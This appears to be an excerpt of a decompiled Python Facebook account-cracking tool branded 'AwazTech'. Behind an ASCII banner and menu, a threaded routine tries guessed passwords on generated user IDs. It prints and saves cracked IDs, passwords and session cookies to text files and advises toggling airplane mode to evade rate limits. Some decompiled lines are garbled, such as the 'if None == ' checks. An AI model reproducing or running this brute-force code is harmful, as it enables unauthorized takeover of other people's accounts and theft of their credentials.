...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/AwazTech/')
        return None
    if None == '3':
        os.system('xdg-open https://www.facebook.com/AwazTech077/')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/AwazTech/')
        return None
...
$$ |  $$ |$$$  / \$$$ |$$ |  $$ | $$  /       $$ |   $$ |      $$ |  $$\ $$ |  $$ |
$$ |  $$ |$$  /   \$$ |$$ |  $$ |$$$$$$$$\    $$ |   $$$$$$$$\ \$$$$$$  |$$ |  $$ |
\__|  \__|\__/     \__|\__|  \__|\________|   \__|   \________| \______/ \__|  \__|
...
\033[1;37m================= \33[32;45mFeel the power of AWAZ\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mAwaz\33[0;m\033[1;32m \033[1;33mTECH\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m AWAZ TECH
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m@AwazTech
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mAWAZ TECH
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
\033[1;37m \33[32;45m\33[0;m
      \33[37;41m\t WELLCOME TO AWAZTECH TOOL\33[0;m
\033[1;37m \33[32;45m\33[0;m\n""")
loop = 0
oks = []
cps = []
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;31m USE AIROPLANE MODW IN EVERY 4 MINUTES ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(AWAZTECH-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AWAZTECH-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AWAZTECH-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AWAZ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
